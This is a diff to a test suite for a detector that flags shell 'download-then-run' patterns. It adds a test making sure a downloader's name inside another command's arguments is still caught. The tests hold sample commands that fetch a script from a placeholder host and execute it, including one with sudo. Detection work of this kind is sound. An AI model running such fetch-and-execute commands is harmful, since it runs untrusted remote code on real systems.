@@ -165,6 +165,9 @@ describe("Vercel review of the performance commit", () => {
   it("01M81HWRT5611WTCF243Z3PVG2: inside a quoted shell body, a download belongs to the nearest downloader", () => {
     for (const t of ['bash -c "curl -s https://x.invalid/ok; wget https://x.invalid/i.sh; sh i.sh"', "sh -c 'curl https://x.invalid; wget https://x.invalid/i.sh && bash i.sh'"]) expect(findExecPatterns(t).map((h) => h.rule), t).toContain("download-then-run");
   });
+  it("01M81J4P1T65EM44K1DKJFX9BD: a downloader's name inside another command's arguments is not a command", () => {
+    for (const t of ['wget --header "X: curl" https://x.invalid/i.sh && sh i.sh', "wget --user-agent curl/8 https://x.invalid/i.sh; bash i.sh", "sudo wget https://x.invalid/i.sh && sh i.sh"]) expect(findExecPatterns(t).map((h) => h.rule), t).toContain("download-then-run");
+  });
   it("an unclosed quote ends at the line, so it cannot hide the lines after it", () => {
     expect(findExecPatterns('echo "unclosed\ncurl -o /tmp/a https://x.invalid && sh /tmp/a').map((h) => h.rule)).toContain("download-then-run");
   });
